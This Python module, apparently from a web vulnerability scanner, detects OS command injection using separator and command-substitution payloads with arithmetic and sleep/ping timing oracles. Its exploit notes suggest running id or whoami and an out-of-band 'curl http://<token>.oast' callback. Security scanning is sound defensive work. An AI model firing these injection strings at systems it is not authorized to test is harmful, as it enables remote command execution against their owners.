from __future__ import annotations
from huntnyx.core.common import *  # noqa: F401,F403

# ════════════════════════════════════════════════════════════════════════
#  OS COMMAND INJECTION
#
#  Two INDEPENDENT confirmation classes, so a CONFIRMED verdict is honest:
#
#    cmdi.arith  (PROOF)  in-band arithmetic executed by a shell. We inject a
#                         construct that PRINTS a*b for two fresh random pairs;
#                         a shell computes it, a reflecting app cannot. The raw
#                         payload holds the operands but NOT the product, so
#                         "product in body" ⇒ real execution (same oracle as
#                         SSTI), double-checked to make a numeric coincidence
#                         ~1e-14.
#
#    cmdi.time   (PROOF)  blind timing with MULTI-DELAY CORRELATION. One slow
#                         response proves nothing (jitter); we require the
#                         response time to scale monotonically with the injected
#                         sleep (0 → D → 2D), which network noise can't fake.
#
#  arith + time → two classes → CONFIRMED.  Either alone → TENTATIVE.
#
#  Injection is attempted two ways, because they reach DIFFERENT sink shapes:
#
#    * SEPARATOR       <val>;<cmd> , <val>|<cmd> , … — runs a NEW command.
#                      Works for `system("ping "+input)` style sinks. Broken by
#                      quoting: inside "…" or '…' the separator is literal.
#
#    * SUBSTITUTION    $(<cmd>) , `<cmd>` , "$(<cmd>)" , '$(<cmd>)' , $((a*b)).
#                      Fires INLINE with no separator, so it reaches sinks where
#                      the input is embedded in an argument or inside double
#                      quotes — exactly the cases the separator set misses.
# ════════════════════════════════════════════════════════════════════════


_CMDI_DELAY = 3                       # seconds; timing oracle probes at D and 2D
_SEP_PREFIXES = ("", "127.0.0.1")     # bare value, or a benign host-like prefix
_SEPARATORS = (";", "|", "&&", "&", "\n")


def _cmd_print(a, b):
    """POSIX command that prints a*b to stdout (expr; the \\* avoids globbing)."""
    return f"expr {a} \\* {b}"


def _build_injectors():
    """Each injector wraps an arbitrary command so its stdout surfaces in the
    response, and (where possible) wraps a delay. Returns dicts with:
        label            human tag for the signal detail
        arith(a, b)      -> payload string that prints a*b
        delay(secs)      -> payload string that sleeps `secs`  (or None)
    Default-arg binding freezes the loop vars (no late-binding bug)."""
    injs = []

    # --- separator style: <prefix><sep><cmd> (runs a new command) ----------
    for prefix in _SEP_PREFIXES:
        for sep in _SEPARATORS:
            injs.append({
                "label": f"separator {sep!r}",
                "arith": (lambda a, b, p=prefix, s=sep: f"{p}{s}{_cmd_print(a, b)}"),
                "delay": (lambda d, p=prefix, s=sep: f"{p}{s}sleep {d}"),
                "ping":  (lambda d, p=prefix, s=sep: f"{p}{s}ping -c {d + 1} 127.0.0.1"),
            })

    # --- substitution style: inline, no separator needed -------------------
    subs = (
        ("subst $()",       lambda body: f"$({body})"),
        ("subst backtick",  lambda body: f"`{body}`"),
        ("subst \"$()\"",   lambda body: f'"$({body})"'),   # double-quote context
        ("subst '$()'",     lambda body: f"'$({body})'"),   # single-quote breakout
    )
    for label, wrap in subs:
        injs.append({
            "label": label,
            "arith": (lambda a, b, w=wrap: w(_cmd_print(a, b))),
            "delay": (lambda d, w=wrap: w(f"sleep {d}")),
            "ping":  (lambda d, w=wrap: w(f"ping -c {d + 1} 127.0.0.1")),
        })

    # --- arithmetic expansion: $((a*b)) (in-band only, no sleep) -----------
    for val in (lambda a, b: f"$(({a}*{b}))", lambda a, b: f"x$(({a}*{b}))"):
        injs.append({"label": "arith-expansion",
                     "arith": val, "delay": None, "ping": None})

    return injs


_CMDI_INJECTORS = _build_injectors()
_CMDI_DELAY_CAPABLE = [j for j in _CMDI_INJECTORS if j["delay"]]


class CommandInjectionModule(_Module):
    name = vuln = "cmdi"

    def requires(self, ip):
        # shell payloads make no sense against an XML body endpoint
        return ip.dynamic and not ip.body_is_xml

    @staticmethod
    def _text(http, ip, value):
        return _send_with(http, ip, value, cache=False).text

    @staticmethod
    def _elapsed(http, ip, value):
        return _send_with(http, ip, value, cache=False).elapsed

    def probe(self, http, ip):
        if not self.requires(ip):
            return []
        sigs = []
        baseline = self._text(http, ip, "hnyx" + _rand())

        winner = self._arith(http, ip, baseline)
        if winner:
            inj, example = winner
            sigs.append(Signal(
                self.vuln, f"cmd-arithmetic[{inj['label']}]", "cmdi.arith",
                SignalStrength.PROOF,
                "shell evaluated injected arithmetic (double-verified)",
                {"payload": example}))

        tsig = self._time(http, ip, winner)
        if tsig:
            inj, d, t0, t1, t2, example = tsig
            sigs.append(Signal(
                self.vuln, f"time-correlated[{inj['label']}]", "cmdi.time",
                SignalStrength.PROOF,
                f"response time scaled with injected sleep "
                f"(~{t0:.1f}/{t1:.1f}/{t2:.1f}s for 0/{d}/{2 * d}s)",
                {"payload": example}))

        if self._debug:
            wl = winner[0]["label"] if winner else "-"
            tl = tsig[0]["label"] if tsig else "-"
            UI.dim(f"      [cmdi] {ip.method} {ip.url} [{ip.param}] "
                   f"arith={wl} time={tl}")
        return sigs

    # --- class 1: in-band arithmetic (separator OR substitution) -----------
    def _arith(self, http, ip, baseline):
        for inj in _CMDI_INJECTORS:
            a, b = random.randint(1000, 9999), random.randint(1000, 9999)
            value = inj["arith"](a, b)
            body = self._text(http, ip, value)
            product = str(a * b)
            if product not in body or product in baseline:
                continue
            # double-check with a fresh product on the SAME injector
            # (within-class corroboration → kills numeric coincidence)
            a2, b2 = random.randint(1000, 9999), random.randint(1000, 9999)
            if str(a2 * b2) in self._text(http, ip, inj["arith"](a2, b2)):
                return inj, value
        return None

    # --- class 2: multi-delay time correlation -----------------------------
    def _time(self, http, ip, winner):
        d = _CMDI_DELAY
        # reuse the injector arithmetic already proved (if it can sleep);
        # otherwise sweep the delay-capable injectors (bounded).
        if winner and winner[0]["delay"]:
            candidates = [winner[0]]
        else:
            candidates = _CMDI_DELAY_CAPABLE[:6]
        for inj in candidates:
            for maker in ("delay", "ping"):
                build = inj[maker]
                if build is None:
                    continue
                t0 = self._elapsed(http, ip, build(0))
                t1 = self._elapsed(http, ip, build(d))
                if (t1 - t0) < 0.6 * d:          # quick reject before spending 2D
                    continue
                t2 = self._elapsed(http, ip, build(2 * d))
                # monotonic AND magnitude scales, with a loose upper bound to
                # reject a pathological one-off stall
                if (t2 - t1) >= 0.6 * d and (t2 - t0) <= 2.2 * (2 * d) + 3.0:
                    return inj, d, t0, t1, t2, build(d)
        return None


def phase_cmdi(target, config, runner):
    return _vuln_phase(target, config, runner, "cmdi", exploit=_cmdi_exploit_lines)


def _cmdi_exploit_lines(techniques):
    return [
        "impact : arbitrary OS command execution (RCE)",
        "verify : swap the arithmetic marker for `id` / `whoami`; for blind",
        "         cases use an OAST host, e.g. ;curl http://<token>.oast  or",
        "         $(curl http://<token>.oast)  — authorized testing only",
    ]


def _r_cmdi(d):
    return _r_injection("COMMAND INJECTION (RCE)", d, exploit=_cmdi_exploit_lines)


INJECTION_MODULES.append(CommandInjectionModule)
